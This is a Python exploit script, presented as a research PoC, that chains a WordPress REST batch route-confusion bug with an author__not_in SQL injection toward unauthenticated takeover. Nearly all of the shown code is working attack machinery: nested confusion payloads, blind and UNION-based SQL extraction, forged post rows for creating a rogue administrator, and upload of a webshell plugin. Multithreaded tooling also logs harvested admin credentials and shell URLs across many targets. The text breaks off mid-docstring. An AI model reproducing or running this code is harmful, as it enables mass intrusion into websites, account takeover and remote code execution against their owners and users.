#!/usr/bin/env python3
"""
poc2.py – CVE-2026-63030 + CVE-2026-60137 unified research PoC
Unauthenticated WordPress SQLi → RCE via REST batch route confusion.

  CVE-2026-63030  (GHSA-ff9f-jf42-662q)  REST batch route confusion → RCE
  CVE-2026-60137  (GHSA-fpp7-x2x2-2mjf)  WP_Query author__not_in SQLi

  Discovered by Adam Kues (Assetnote / Searchlight Cyber).

  UNAUTH CHAIN AFFECTS:  6.9.0–6.9.4  and  7.0.0–7.0.1
  PATCHED:               6.8.6 (SQLi) · 6.9.5 · 7.0.2 · 7.1-beta2
  PRECONDITIONS:         REST API reachable, no Redis/Memcached object cache,
                         ≥1 published post.

Chain (check → read → shell):
  1. check   – non-destructive: batch probe + confusion marker + boolean SQLi differential
  2. read    – blind char-by-char extraction (fingerprint or user hashes)
  3. shell   – crack-free pre-auth admin creation → login → plugin webshell upload → exec

Modelled after: 0xsha/wp2shell (https://github.com/0xsha/wp2shell)
Stdlib only – no pip install required.
For authorised security research on systems you own or may test in writing.
"""
from __future__ import annotations

import argparse
import hashlib
import io
import json
import os
import re
import secrets
import shlex
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from http.cookiejar import CookieJar
from typing import Any, Callable, Dict, List, Optional, Tuple

__version__ = "2.0-research"
BANNER = "poc2.py – CVE-2026-63030 + CVE-2026-60137  research tool"

_DEFAULT_UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)

# ──────────────────────────────────────────── Windows ANSI colours ──
def _try_enable_windows_ansi() -> bool:
    """
    Enable VT100/ANSI escape-code processing on Windows consoles.
    Works on Windows 10 v1511+ and Windows Server 2016+.
    Returns True when ANSI is available after the call.
    Falls back gracefully on older systems (Server 2012, XP, etc.).
    """
    if sys.platform != "win32":
        return True
    try:
        import ctypes
        import ctypes.wintypes
        STD_OUTPUT_HANDLE              = -11
        ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
        k32    = ctypes.windll.kernel32                      # type: ignore[attr-defined]
        handle = k32.GetStdHandle(STD_OUTPUT_HANDLE)
        mode   = ctypes.wintypes.DWORD(0)
        if k32.GetConsoleMode(handle, ctypes.byref(mode)):
            new_mode = mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING
            return bool(k32.SetConsoleMode(handle, new_mode))
    except Exception:
        pass
    return False

# ──────────────────────────────────────────────── version intel ──
# The unauth batch chain only lands on 6.9.0–7.0.1. 6.8.x carries the
# SQLi bug but NOT the batch route-confusion regression (6.9.0 introduced it).
_FULL_CHAIN = {(6, 9, n) for n in range(0, 5)} | {(7, 0, 0), (7, 0, 1)}
_SQLI_ONLY  = {(6, 8, n) for n in range(0, 6)}
_PATCHED    = {(6, 8, 6), (6, 9, 5), (7, 0, 2), (7, 1, 0)}

# ───────────────────────────────────────────────────── output ──
_TTY   = sys.stdout.isatty()
# Enable ANSI on Windows consoles (Server 2016+/Win10+); disable on older ones
_COLOR = _TTY and (_try_enable_windows_ansi() if sys.platform == "win32" else True)

# Thread-local storage: quiet flag + per-thread opener cache
_tl: threading.local = threading.local()

# ── Thread-safe stdout ──────────────────────────────────────────────────────
# Without this lock, 100 threads calling print() simultaneously cause:
#   • GIL contention (threads queue waiting for stdout lock)
#   • Interleaved/garbled output lines
#   • Measurable slowdown as thread count rises
_print_lock = threading.Lock()

def _tprint(text: str) -> None:
    """Thread-safe print: acquires _print_lock, prints, flushes."""
    with _print_lock:
        sys.stdout.write(text + "\n")
        sys.stdout.flush()

# ── Cached insecure SSL context (singleton) ─────────────────────────────────
# ssl.create_default_context() is expensive (loads CA bundle, creates C objects).
# Creating one per opener per thread was a major source of overhead with many
# threads. One shared context is safe for read-only verification bypass.
_INSECURE_SSL_CTX: Optional[ssl.SSLContext] = None
_SSL_CTX_LOCK = threading.Lock()

def _get_insecure_ssl_ctx() -> ssl.SSLContext:
    global _INSECURE_SSL_CTX
    if _INSECURE_SSL_CTX is None:
        with _SSL_CTX_LOCK:
            if _INSECURE_SSL_CTX is None:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                _INSECURE_SSL_CTX  = ctx
    return _INSECURE_SSL_CTX

# ── Connection semaphore ────────────────────────────────────────────────────
# Caps the number of simultaneous TCP/SSL connections regardless of thread count.
# Without this, 100 threads × retries can exhaust OS file-descriptor limits and
# overwhelm the NIC/routing stack, causing the system to hang and throughput to
# collapse.  The cap is set dynamically in main() based on --threads.
_CONN_SEM: Optional[threading.BoundedSemaphore] = None

def _init_conn_sem(max_connections: int) -> None:
    global _CONN_SEM
    _CONN_SEM = threading.BoundedSemaphore(max(1, max_connections))


def _is_quiet() -> bool:
    return getattr(_tl, "quiet", False)


# ── single output file (append-only, thread-safe) ──────────────────────────────────────────
_out_lock = threading.Lock()


def _append_result(url, username, password, outfile) -> None:
    """
    Append one credential line to the shared output file.
    Format: https://target.com/wp-login.php#username@password
    Thread-safe. Creates file on first call; appends on subsequent calls.
    Never splits into per-host files.
    """
    if not outfile:
        return
    line = f"{url.rstrip('/')}/wp-login.php#{username}@{password}\n"
    try:
        with _out_lock:
            with open(outfile, "a", encoding="utf-8") as fh:
                fh.write(line)
        good(f"Saved  {url.rstrip('/')}/wp-login.php  →  {outfile}")
    except OSError as exc:
        warn(f"Could not write to {outfile}: {exc}")


# ── mm.zip plugin installer (install-only, no activation) ────────────────────────────────
_plugin_lock = threading.Lock()


def _mm_zip_path() -> "Optional[str]":
    """Return absolute path of mm.zip sitting beside the script, or None."""
    here = os.path.dirname(os.path.abspath(
        sys.executable if getattr(sys, "frozen", False) else __file__))
    p = os.path.join(here, "mm.zip")
    return p if os.path.isfile(p) else None


def _append_plugin(url: str, plugin_rel: str) -> None:
    """
    Append one plugin URL line to plugins.txt (always this filename).
    Format: https://target.com/wp-content/plugins/mm/mm.php
    Thread-safe.
    """
    line = f"{url.rstrip('/')}/wp-content/plugins/mm/mm.php\n"
    try:
        with _plugin_lock:
            with open("plugins.txt", "a", encoding="utf-8") as fh:
                fh.write(line)
        good(f"Plugin URL saved → plugins.txt  ({url.rstrip('/')})")
    except OSError as exc:
        warn(f"Could not write plugins.txt: {exc}")


def _try_install_mm(url: str, username: str, password: str,
                    hc: "HttpConfig") -> bool:
    """
    Log in with the supplied admin credentials, upload mm.zip without
    activating it, and record the result in plugins.txt.
    Called after every successful admin creation in any mode.
    Returns True when the plugin was installed and recorded.
    """
    zip_path = _mm_zip_path()
    if zip_path is None:
        warn("mm.zip not found beside the script — skipping plugin install.")
        return False

    try:
        with open(zip_path, "rb") as _f:
            zip_data = _f.read()
    except OSError as exc:
        warn(f"Cannot read mm.zip: {exc} — skipping plugin install.")
        return False

    slug = os.path.splitext(os.path.basename(zip_path))[0]  # "mm"

    info(f"Logging in as {username!r} to install mm.zip ...")
    session = AdminSession(url, http=hc)
    if not session.login(username, password):
        warn("Login failed — cannot install mm.zip.")
        return False

    info("Uploading mm.zip (install only, no activation) ...")
    plugin_rel = session.install_zip(zip_path, zip_data, slug)
    if plugin_rel:
        good(f"Plugin installed: {url.rstrip('/')}{plugin_rel}")
        _append_plugin(url, plugin_rel)
        return True
    warn("Plugin install not confirmed (upload may have failed).")
    return False


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def info(m: str) -> None:
    if not _is_quiet(): _tprint(f"[*] {m}")

def good(m: str) -> None:
    if not _is_quiet(): _tprint(_paint("32", f"[+] {m}"))

def bad(m: str) -> None:
    if not _is_quiet(): _tprint(_paint("31", f"[-] {m}"))

def warn(m: str) -> None:
    if not _is_quiet(): _tprint(_paint("33", f"[!] {m}"))


def _progress(text: str) -> None:
    if _TTY and not _is_quiet():
        with _print_lock:
            sys.stdout.write("\r\033[K    " + text)
            sys.stdout.flush()


def _clear_progress() -> None:
    if _TTY and not _is_quiet():
        with _print_lock:
            sys.stdout.write("\r\033[K")
            sys.stdout.flush()


# ──────────────────────────────────────── HTTP transport ──
class TargetError(Exception):
    """Target unreachable (connection refused / DNS / timeout, after retries)."""


@dataclass
class Response:
    status:  int
    elapsed: float
    body:    str

    def json(self) -> Any:
        return json.loads(self.body)


@dataclass
class HttpConfig:
    """Shared transport policy for every request the tool makes."""
    timeout:    float            = 30.0
    proxy:      Optional[str]   = None
    insecure:   bool            = False   # skip TLS verification (self-signed certs)
    headers:    Dict[str, str]  = field(default_factory=dict)
    user_agent: str             = _DEFAULT_UA
    retries:    int             = 2
    delay:      float           = 0.0

    def opener(self, *extra_handlers) -> urllib.request.OpenerDirector:
        handlers = list(extra_handlers)
        if self.proxy:
            handlers.append(urllib.request.ProxyHandler(
                {"http": self.proxy, "https": self.proxy}))
        if self.insecure:
            # Reuse the global singleton — creating a new SSLContext is
            # expensive (loads the CA bundle); sharing one is thread-safe.
            handlers.append(urllib.request.HTTPSHandler(
                context=_get_insecure_ssl_ctx()))
        return urllib.request.build_opener(*handlers)

    def thread_opener(self) -> urllib.request.OpenerDirector:
        """
        Return a per-thread cached opener (no CookieJar).
        Stateless BatchClient / detection calls reuse the same opener for the
        lifetime of a thread, avoiding repeated opener construction overhead.
        The opener is invalidated when proxy/insecure changes.
        """
        cache_key = (self.proxy, self.insecure, self.user_agent)
        cache: dict = getattr(_tl, "_opener_cache", {})
        if cache.get("_key") != cache_key:
            cache = {"_key": cache_key, "opener": self.opener()}
            _tl._opener_cache = cache
        return cache["opener"]

    def merge_headers(self, base: Optional[Dict[str, str]] = None) -> Dict[str, str]:
        h = {"User-Agent": self.user_agent}
        if base:
            h.update(base)
        h.update(self.headers)          # caller-supplied headers win
        return h

    def send(self, opener: urllib.request.OpenerDirector,
             request: urllib.request.Request) -> Response:
        if self.delay:
            time.sleep(self.delay)
        last: Optional[Exception] = None
        # ── Connection semaphore ──────────────────────────────────────────────
        # Acquire before opening a TCP connection; release immediately after the
        # response is read.  This caps simultaneous kernel-level connections,
        # preventing fd exhaustion and NIC saturation that cause the OS to slow
        # down even when there are plenty of idle Python threads.
        sem = _CONN_SEM
        if sem:
            sem.acquire()
        try:
            for attempt in range(self.retries + 1):
                start = time.monotonic()
                try:
                    resp = opener.open(request, timeout=self.timeout)
                    return Response(resp.status, time.monotonic() - start,
                                    resp.read().decode("utf-8", "replace"))
                except urllib.error.HTTPError as exc:
                    return Response(exc.code, time.monotonic() - start,
                                    exc.read().decode("utf-8", "replace"))
                except OSError as exc:
                    # ── SSL auto-fallback ──────────────────────────────────────
                    # If certificate verification fails (e.g. self-signed cert
                    # on a local lab) and the caller did not already disable
                    # verification, permanently enable insecure mode on this
                    # HttpConfig and retry.  Setting self.insecure = True ensures
                    # the CALLER's next opener() call also gets the bypass —
                    # critical for login sessions where cookies must survive.
                    if (not self.insecure
                            and isinstance(getattr(exc, "reason", None), ssl.SSLError)):
                        warn("SSL certificate error – enabling insecure mode permanently "
                             "(self-signed cert); rebuilding opener with TLS bypass.")
                        self.insecure = True          # ← persist for all future openers
                        # Use the cached singleton — no new context allocation.
                        opener.add_handler(urllib.request.HTTPSHandler(
                            context=_get_insecure_ssl_ctx()))
                        try:
                            start2 = time.monotonic()
                            resp2 = opener.open(request, timeout=self.timeout)
                            return Response(resp2.status, time.monotonic() - start2,
                                            resp2.read().decode("utf-8", "replace"))
                        except urllib.error.HTTPError as exc2:
                            return Response(exc2.code, time.monotonic() - start2,
                                            exc2.read().decode("utf-8", "replace"))
                        except OSError:
                            pass   # fall through to normal retry logic
                    last = exc
                    if attempt < self.retries:
                        time.sleep(0.4 * (attempt + 1))
            raise TargetError(
                f"cannot reach {request.full_url}: {getattr(last, 'reason', last)}")
        finally:
            if sem:
                sem.release()


# ──────────────────────────── batch route confusion (CVE-2026-63030) ──
# "///" is rejected by wp_parse_url(), seeding a WP_Error into the
# $matches array and desyncing it from $validation by one entry.
# That off-by-one makes the *following* sub-request be dispatched by the
# *wrong* handler — the core of CVE-2026-63030.
_PRIMER = {"method": "POST", "path": "///"}
_MARKER_CODES = ("parse_path_failed", "block_cannot_read", "rest_batch_not_allowed")


def _walk_codes(value: Any, out: Optional[set] = None) -> set:
    """Collect every 'code' string anywhere in a nested batch response."""
    if out is None:
        out = set()
    if isinstance(value, dict):
        c = value.get("code")
        if isinstance(c, str):
            out.add(c)
        for v in value.values():
            _walk_codes(v, out)
    elif isinstance(value, list):
        for v in value:
            _walk_codes(v, out)
    return out


class BatchClient:
    """
    Talks to the REST batch endpoint and builds the nested confusion payloads.

    variant='posts' (default, verified end-to-end):
      Outer batch:  [PRIMER, POST /wp/v2/posts {inner}, POST /batch/v1]
      Inner batch:  [PRIMER, GET /wp/v2/users?author_exclude=PAYLOAD, GET /wp/v2/posts]

      The inner confusion dispatches the USERS request via the POSTS collection
      handler, which places author_exclude into post_author NOT IN (PAYLOAD) in
      WP_Query — the SQLi sink (CVE-2026-60137).

    variant='categories':
      Uses /wp/v2/categories as the carrier instead of /wp/v2/posts.
    """

    def __init__(self, base_url: str, *, http: Optional[HttpConfig] = None,
                 rest_route: Optional[bool] = None, variant: str = "posts") -> None:
        self.base_url   = base_url.rstrip("/")
        self.http       = http or HttpConfig()
        self.rest_route = rest_route   # None = auto-detect on first use
        self.variant    = variant
        # thread_opener() returns a cached per-thread opener (no CookieJar needed
        # for batch requests) so we avoid creating a new opener + SSL context
        # for every BatchClient instantiation across hundreds of targets.
        self._opener    = self.http.thread_opener()

    def _endpoint(self, rest_route: bool) -> str:
        return (f"{self.base_url}/?rest_route=/batch/v1" if rest_route
                else f"{self.base_url}/wp-json/batch/v1")

    def resolve(self) -> str:
        """Auto-detect which REST base the target uses; cache the result."""
        if self.rest_route is not None:
            return self._endpoint(self.rest_route)
        for rr in (False, True):
            try:
                r = self._raw_post(self._endpoint(rr), {"requests": []})
                if r.status == 207:
                    self.rest_route = rr
                    return self._endpoint(rr)
            except TargetError:
                pass
        self.rest_route = False
        return self._endpoint(False)

    @property
    def endpoint(self) -> str:
        return self.resolve()

    def _raw_post(self, url: str, payload: dict) -> Response:
        req = urllib.request.Request(
            url, data=json.dumps(payload).encode(), method="POST",
            headers=self.http.merge_headers({"Content-Type": "application/json"}))
        return self.http.send(self._opener, req)

    def post(self, payload: dict) -> Response:
        return self._raw_post(self.endpoint, payload)

    def probe(self) -> Response:
        """Empty batch — confirms the endpoint is reachable and returns 207."""
        return self.post({"requests": []})

    def confusion_markers(self) -> bool:
        """
        Version-independent, non-destructive CVE-2026-63030 confirmation.

        The desync makes POST /wp/v2/posts be answered by the block-renderer
        permission callback → 'block_cannot_read' appears in the response codes.
        This works even when the SQLi sink is object-cached or WAF-filtered.
        Neither create-handler actually runs (permission denied first).
        Detection technique per Hadrian / Icex0.
        """
        payload = {"requests": [
            _PRIMER,
            {"method": "POST", "path": "/wp/v2/posts"},
            {"method": "POST", "path": "/wp/v2/block-renderer/core/paragraph"},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}
        try:
            return "block_cannot_read" in _walk_codes(self.post(payload).json())
        except Exception:
            return False

    def _payload(self, author_not_in: str) -> dict:
        """
        Build the nested 3-layer batch payload that routes author_not_in into
        post_author NOT IN (author_not_in) in WP_Query.
        """
        enc = urllib.parse.quote(author_not_in, safe="")
        if self.variant == "categories":
            inner = {"requests": [
                _PRIMER,
                {"method": "GET",
                 "path": f"/wp/v2/categories?author_exclude={enc}"},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]}
            carrier = {
                "method": "POST", "path": "/wp/v2/categories",
                "body": {"name": f"x{secrets.token_hex(3)}",
                         "requests": inner["requests"]},
            }
        else:   # "posts" — the attacker-verified variant
            inner = {"requests": [
                _PRIMER,
                {"method": "GET",
                 "path": f"/wp/v2/users?author_exclude={enc}"},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]}
            carrier = {"method": "POST", "path": "/wp/v2/posts", "body": inner}
        return {"requests": [
            _PRIMER,
            carrier,
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    def inject(self, author_not_in: str) -> Response:
        """Fire one injection; used by BlindSQLi for the boolean/timing oracle."""
        return self.post(self._payload(author_not_in))

    def union_inject(self, author_not_in: str) -> Response:
        """
        Land author_not_in in a no-ORDER-BY WP_Query so a UNION SELECT survives.

        Targets /wp/v2/posts/999999 (item route) so collection-only params
        (author_exclude, orderby, per_page) pass its schema validation unchecked.
        orderby=none drops the trailing ORDER BY that would break the UNION.
        per_page=500 keeps WP_Query in full-row mode so a UNION SELECT row
        comes back as a fake WP_Post in the REST response.
        Technique: Icex0/wp2shell-poc.
        """
        q = urllib.parse.urlencode({
            "author_exclude": author_not_in,
            "orderby":        "none",
            "per_page":       "500",
        })
        inner = {"requests": [
            _PRIMER,
            {"method": "GET", "path": f"/wp/v2/posts/999999?{q}"},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]}
        return self.post({"requests": [
            _PRIMER,
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]})

    def rows(self, response: Response) -> Optional[list]:
        """
        Dig into the nested batch response and return the inner get_items() list.
        Structure: outer[1].body.inner[1].body → list of post objects (or None).

        Fallback oracle: some sites (WooCommerce, Jetpack, heavy caching plugins)
        return an empty body array inside nested batch sub-requests even when the
        query matched rows.  In those cases X-WP-Total in the inner response
        headers is the reliable signal — non-zero means the condition was TRUE.
        """
        try:
            node  = response.json()["responses"][1]["body"]["responses"][1]
            body  = node.get("body")
            # Fast path: body is a non-empty list → condition TRUE
            if isinstance(body, list) and body:
                return body
            # Header fallback: X-WP-Total > 0 → condition TRUE
            # (body may be [] when WC/Jetpack suppress items in sub-request context)
            total_raw = node.get("headers", {}).get("X-WP-Total", "")
            try:
                if int(total_raw) > 0:
                    return [1]          # sentinel truthy value
            except (ValueError, TypeError):
                pass
            # Empty body + no/zero total → condition FALSE
            if isinstance(body, list):
                return body             # returns []
        except (KeyError, IndexError, TypeError, ValueError):
            pass
        return None


class DirectClient:
    """
    Direct injection into a *facilitating* sink (plugin / mu-plugin / theme)
    that forwards a raw request parameter into WP_Query['author__not_in'].

    This is the path for CVE-2026-60137 on WordPress 6.8.x where core REST
    coerces author_exclude to an int array — the batch chain does not work there.

    Time-based by default; pass true_contains (a response substring present
    only when rows match) to switch to faster boolean mode.
    """

    def __init__(self, base_url: str, endpoint: str, param: str, *,
                 http: Optional[HttpConfig] = None,
                 true_contains: Optional[str] = None) -> None:
        self.base_url      = base_url.rstrip("/")
        self.endpoint      = endpoint if endpoint.startswith("/") else "/" + endpoint
        self.param         = param
        self.http          = http or HttpConfig()
        self.true_contains = true_contains
        self._opener       = self.http.opener()

    def inject(self, author_not_in: str) -> Response:
        sep = "&" if "?" in self.endpoint else "?"
        url = (f"{self.base_url}{self.endpoint}{sep}{self.param}="
               + urllib.parse.quote(author_not_in, safe=""))
        req = urllib.request.Request(url, headers=self.http.merge_headers())
        return self.http.send(self._opener, req)

    def rows(self, response: Response) -> Optional[list]:
        if self.true_contains and self.true_contains in response.body:
            return [1]
        return None


# ──────────────────────────────────── blind SQLi oracles ──
_MIN, _MAX = 32, 126


class BlindSQLi:
    """
    Boolean- and time-based blind extraction over any author__not_in sink.

    The injected value lands as:   post_author NOT IN (<value>)
    so '0) AND ({cond})-- -' closes the IN() list and appends arbitrary SQL.

      cond TRUE  → post_author NOT IN (0) AND TRUE  → posts returned
      cond FALSE → post_author NOT IN (0) AND FALSE → no posts returned

    Works with BatchClient (6.9+/7.0 chain) and DirectClient (facilitated sink).
    time_mode encodes each truth in request latency via conditional SLEEP.
    sqlite=True uses UNICODE/SUBSTR instead of MySQL-specific ASCII/SUBSTRING.
    """

    def __init__(self, client, *, sleep: float = 3.0,
                 time_mode: bool = False, sqlite: bool = False) -> None:
        self.client    = client
        self.sleep     = sleep
        self.time_mode = time_mode
        self.sqlite    = sqlite
        self.requests  = 0

    def confirm(self) -> bool:
        """
        Deterministic differential: 1=1 and 1=0 must disagree.
        Independent of row counts and the OR short-circuit that defeats a
        naive OR-SLEEP probe on a default install.
        """
        return self._true("1=1") and not self._true("1=0")

    def has_rows(self) -> bool:
        """Whether the sink returns ≥1 row (baseline check)."""
        return self._true("1=1")

    def time_delay(self) -> Tuple[float, float]:
        """(baseline, injected) wall time — time-based channel corroboration."""
        base = self.client.inject(
            "0) AND (SELECT 1 FROM (SELECT SLEEP(0))_z)-- -").elapsed
        self.requests += 1
        delayed = self.client.inject(
            f"0) AND (SELECT 1 FROM (SELECT SLEEP({self.sleep:g}))_z)-- -").elapsed
        self.requests += 1
        return base, delayed

    def extract(self, expr: str, *, max_length: int = 128,
                on_char: Optional[Callable[[str], None]] = None) -> str:
        """
        Extract a string value character by character using binary search.
        COALESCE prevents a NULL from being mis-read as a zero-length string.
        Uses UNICODE/SUBSTR for SQLite targets (--sqlite), ASCII/SUBSTRING for MySQL.
        """
        if self.sqlite:
            def _probe(pos: int) -> str:
                return f"UNICODE(SUBSTR(COALESCE(({expr}),''),{pos},1))"
        else:
            def _probe(pos: int) -> str:
                return f"ASCII(SUBSTRING(COALESCE(({expr}),''),{pos},1))"
        chars: List[str] = []
        for pos in range(1, max_length + 1):
            probe = _probe(pos)
            if not self._true(f"{probe} > 0"):
                break
            lo, hi = _MIN, _MAX
            while lo < hi:
                mid = (lo + hi) // 2
                if self._true(f"{probe} > {mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            chars.append(chr(lo))
            if on_char:
                on_char("".join(chars))
        return "".join(chars)

    def integer(self, expr: str) -> int:
        """Read an integer; raises ValueError so it can't be confused with zero."""
        t = self.extract(expr).strip()
        if not t.lstrip("-").isdigit():
            raise ValueError(f"expected integer from {expr!r}, got {t!r}")
        return int(t)

    def _true(self, cond: str) -> bool:
        self.requests += 1
        if self.time_mode:
            # Use the same subquery-SLEEP pattern that time_delay() uses —
            # bare IF() causes timeouts on some targets.
            resp = self.client.inject(
                f"0) AND (SELECT 1 FROM "
                f"(SELECT SLEEP(IF(({cond}),{self.sleep:g},0)))_z)-- -")
            return resp.elapsed >= self.sleep * 0.8
        return bool(self.client.rows(
            self.client.inject(f"0) AND ({cond})-- -")))


# ──────────────── UNION extractor + crack-free pre-auth admin creation ──
# The in-band UNION primitive forges a fake WP_Post row and the
# SQLi-to-customizer bridge turns it into a new administrator (no hash, no crack).
# Technique: sergiointel/wp2shell-poc (originator); implementation adapted from
# Icex0/wp2shell-poc.

class UnionSQLi:
    """
    In-band UNION extractor: forge a fake wp_posts row, read the reflected
    post_title in one round-trip via BatchClient.union_inject().

    Data is encoded as  ||HEX||  to survive WordPress text filters and JSON
    serialisation; the regex strips the sentinels and hex-decodes the payload.

    sqlite=True switches all SQL expressions to SQLite dialect:
      - hex literals: 0x…  →  X'…'   (or plain quoted strings)
      - CONCAT(…)          →  (…||…||…)
      - CAST(… AS CHAR)    →  CAST(… AS TEXT)
      - INFORMATION_SCHEMA →  sqlite_master
    """

    _COLUMNS   = 23          # wp_posts column count (stable in modern WordPress)
    _TITLE_COL = 6           # post_title — rendered back in the REST response
    _RE        = re.compile(r"\|\|([0-9A-Fa-f]*)\|\|")

    # MySQL dialect constants
    _PUBLISH_MYSQL = "0x7075626c697368"
    _POST_MYSQL    = "0x706f7374"
    _DATE_MYSQL    = "0x323032302d30312d30312030303a30303a3030"

    # SQLite dialect constants (plain quoted strings — safer than X'…' BLOBs)
    _PUBLISH_SQLITE = "'publish'"
    _POST_SQLITE    = "'post'"
    _DATE_SQLITE    = "'2020-01-01 00:00:00'"

    def __init__(self, client: BatchClient, *, sqlite: bool = False) -> None:
        self.client   = client
        self.sqlite   = sqlite
        self.requests = 0

    def available(self) -> bool:
        """Quick sanity check: can we read a known constant?"""
        # MySQL: 0x4f4b → string 'OK';  SQLite: 0x4f4b → integer 20299 (WRONG)
        # Use a plain quoted string that works in both dialects.
        return self._read("SELECT 'OK'") == "OK"

    def extract(self, expr: str) -> str:
        return self._read(expr) or ""

    def integer(self, expr: str) -> int:
        t = (self._read(f"SELECT ({expr})") or "").strip()
        if not t.lstrip("-").isdigit():
            raise ValueError(f"expected integer from {expr!r}, got {t!r}")
        return int(t)

    def _read(self, expr: str) -> Optional[str]:
        self.requests += 1
        # "AND 1=0" suppresses all real posts so the UNION row is the only
        # item returned — essential on high-volume sites (WooCommerce, etc.)
        # where per_page limits would push our fake row off the response.
        resp = self.client.union_inject(
            f"0) AND 1=0 UNION SELECT {self._columns(expr)}-- -")
        m = self._RE.search(resp.body)
        if not m:
            return None
        digits = m.group(1)
        if len(digits) % 2:
            digits = digits[:-1]
        try:
            return bytes.fromhex(digits).decode("utf-8", "replace")
        except ValueError:
            return None

    def _columns(self, expr: str) -> str:
        """Build the 23-column list for the UNION SELECT, with our payload at col 6."""
        if self.sqlite:
            publish = self._PUBLISH_SQLITE
            post    = self._POST_SQLITE
            date    = self._DATE_SQLITE
            # SQLite: string concat with ||, CAST AS TEXT, plain sentinel strings
            payload = f"('||'||HEX(CAST(({expr})AS TEXT))||'||')"
        else:
            publish = self._PUBLISH_MYSQL
            post    = self._POST_MYSQL
            date    = self._DATE_MYSQL
            payload = f"CONCAT(0x7c7c,HEX(CAST(({expr})AS CHAR)),0x7c7c)"

        cols = []
        for i in range(1, self._COLUMNS + 1):
            if i == 1:
                cols.append("999999")
            elif i in (3, 4, 15, 16):
                cols.append(date)
            elif i == self._TITLE_COL:
                cols.append(payload)
            elif i == 8:
                cols.append(publish)
            elif i == 21:
                cols.append(post)
            else:
                cols.append(str(i))
        return ",".join(cols)


_POST_DATE   = "2020-01-01 00:00:00"
_OEMBED_SIZE = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'


def _mysql_hex(text: str) -> str:
    """Encode a Python string as MySQL hex literal (0x…) for safe embedding in SQL."""
    return f"0x{text.encode().hex()}" if text else "''"


def _db_hex(text: str, *, sqlite: bool = False) -> str:
    """
    Encode a Python string as a safe SQL literal.

    MySQL  → 0x{hex}              (e.g.  0x61646d696e)
    SQLite → escaped single-quoted string literal
             (e.g.  'admin', or 'it''s' for strings with single quotes)

    SQLite note: X'…' creates a BLOB, not TEXT, so it does not match TEXT
    columns in WHERE comparisons.  Plain quoted string literals are correct.
    Empty string always returns  ''  (works in both dialects).
    """
    if not text:
        return "''"
    if sqlite:
        # Escape any single quotes by doubling them (standard SQL)
        escaped = text.replace("'", "''")
        return f"'{escaped}'"
    return f"0x{text.encode().hex()}"


def _wp_posts_tuple(row_id: int, *, body: str = "", title: str = "",
                    status: str = "publish", slug: str = "",
                    parent: int = 0, kind: str = "post",
                    author: int = 1, sqlite: bool = False) -> str:
    """Build a 23-value CSV string matching the wp_posts column layout."""
    h = lambda t: _db_hex(t, sqlite=sqlite)  # noqa: E731
    cols = [
        str(row_id),          #  1 ID
        str(author),          #  2 post_author
        h(_POST_DATE),        #  3 post_date
        h(_POST_DATE),        #  4 post_date_gmt
        h(body),              #  5 post_content
        h(title),             #  6 post_title
        "''",                 #  7 post_excerpt
        h(status),            #  8 post_status
        h("closed"),          #  9 comment_status
        h("closed"),          # 10 ping_status
        "''",                 # 11 post_password
        h(slug),              # 12 post_name
        "''",                 # 13 to_ping
        "''",                 # 14 pinged
        h(_POST_DATE),        # 15 post_modified
        h(_POST_DATE),        # 16 post_modified_gmt
        "''",                 # 17 post_content_filtered
        str(parent),          # 18 post_parent
        "''",                 # 19 guid
        "0",                  # 20 menu_order
        h(kind),              # 21 post_type
        "''",                 # 22 post_mime_type
        "0",                  # 23 comment_count
    ]
    return ",".join(cols)


@dataclass
class CreatedAdmin:
    username:        str
    password:        str
    email:           str
    source_admin_id: int
    table_prefix:    str


@dataclass
class _PoisonGraph:
    """
    Builds the set of fake wp_posts rows that, when injected via UNION ALL SELECT
    into the posts table, trick the WordPress customizer into running as an existing
    administrator and executing a POST /wp/v2/users request.
    """
    cache_post_ids:  List[int]
    source_admin_id: int

    def __post_init__(self) -> None:
        self.outer_id      = 1800000000 + secrets.randbelow(100000000)
        self.nav_item_id   = self.outer_id + 1
        self.inner_id      = self.outer_id + 2
        # Three oEmbed cache post IDs recovered via UNION SQLi
        self.changeset_id, self.cache_id, self.request_id = self.cache_post_ids

    def rows(self, changeset: str, trigger_embed_url: str,
             *, sqlite: bool = False) -> List[str]:
        kw = {"sqlite": sqlite}
        return [
            _wp_posts_tuple(
                0, body=f'[embed width="500" height="750"]{trigger_embed_url}[/embed]',
                title="trigger", slug="trigger", **kw),
            _wp_posts_tuple(
                self.changeset_id, body=changeset, title="changeset",
                status="future", slug=str(uuid.uuid4()),
                parent=self.outer_id, kind="customize_changeset", **kw),
            _wp_posts_tuple(
                self.outer_id, body="outer", title="outer",
                status="draft", slug="outer", parent=self.changeset_id, **kw),
            _wp_posts_tuple(
                self.cache_id, title="cache", slug="cache",
                parent=self.changeset_id, **kw),
            _wp_posts_tuple(
                self.nav_item_id, body="nav", title="nav", slug="nav",
                parent=self.request_id, kind="nav_menu_item", **kw),
            _wp_posts_tuple(
                self.request_id, body="parse", title="parse",
                status="parse", slug="parse",
                parent=self.inner_id, kind="request", **kw),
            _wp_posts_tuple(
                self.inner_id, body="inner", title="inner",
                status="draft", slug="inner", parent=self.request_id, **kw),
        ]


class PreAuthAdminCreator:
    """
    Turn the UNION fake-post primitive into a brand-new administrator,
    unauthenticated and without cracking any existing password hash.

    Steps:
      1. UnionSQLi.available() — confirm the UNION path works.
      2. Seed three oEmbed [embed] shortcodes via a fake post (primes the cache).
      3. Recover the wp_posts table name from INFORMATION_SCHEMA.
      4. Find the first existing administrator's user ID.
